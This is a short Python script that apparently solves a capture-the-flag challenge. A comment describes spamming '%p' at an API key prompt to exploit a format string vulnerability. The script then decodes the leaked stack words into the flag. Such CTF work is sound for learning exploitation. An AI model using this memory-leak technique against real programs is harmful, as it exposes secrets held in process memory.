from binascii import unhexlify

# spam %p__ in the API key prompt to abuse format string vuln and print contents of memory
s = "0x8f843d0__0x804b000__0x80489c3__0xf7f3fd80__0xffffffff__0x1__0x8f82160__0xf7f4d110__0xf7f3fdc7__(nil)__0x8f83180__0x3__0x8f843b0__0x8f843d0__0x6f636970__0x7b465443__0x306c5f49__0x345f7435__0x6d5f6c6c__0x306d5f79__0x5f79336e__0x38343136__0x34356562__0xff9c007d__0xf7f7aaf8__0xf7f4d440__0xb964d700__0x1__(nil)__0xf7ddcce9__0xf7f4e0c0__0xf7f3f5c0__0xf7f3f000__0xff9c55d8__0xf7dcd68d__0xf7f3f5c0__0x8048eca__0xff9c55e4__(nil)__0xf7f61f09__0x804b000__0xf7f3f000__0xf7f3fe20__0xff9c5618__0xf7f67d50__0xf7f40890__0xb964d700__0xf7f3f000__0x804b000__0xff9c5618__0x8048c86__0x8f82160__0xff9c5604__0xff9c5618__0x8048be9__0xf7f3f3fc__(nil)__0xff9c56cc__0xff9c56c4__0x1__0x1__0x8f82160__0xb964d700__0xff9c5630__(nil)__(nil)__0xf7d82fa1__0xf7f3f000__0xf7f3f000__(nil)__0xf7d82fa1__0x1__0xff9c56c4__0xff9c56cc__0xff9c5654"

groups = s.split("__")
result = ""

for g in groups:
    try:
        result += unhexlify(g[2:]).decode()[::-1] ## try to decode and flip
    except:
        pass

result += unhexlify("007d").decode()[::-1] ## final character '}'

print(result)